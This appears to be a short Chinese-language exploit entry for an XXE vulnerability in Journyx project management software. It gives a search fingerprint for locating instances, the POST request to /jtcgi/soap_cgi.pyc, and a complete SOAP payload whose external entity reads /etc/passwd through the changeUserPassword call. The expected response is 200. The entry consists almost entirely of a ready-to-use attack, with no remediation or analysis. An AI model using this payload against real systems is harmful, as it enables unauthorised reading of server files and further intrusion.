# Journyx项目管理软件soap_cgi.pycXXE漏洞

Journyx ｜ XXE ｜ —
- **指纹**：`body="Journyx"`
- **请求**：`POST /jtcgi/soap_cgi.pyc HTTP/1.1`

**Payload**
```
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><changeUserPassword><username>&test;</username><curpwd>zzz</curpwd><newpwd>zzz123</newpwd></changeUserPassword></soapenv:Body></soapenv:Envelope>
```
- **响应特征**：200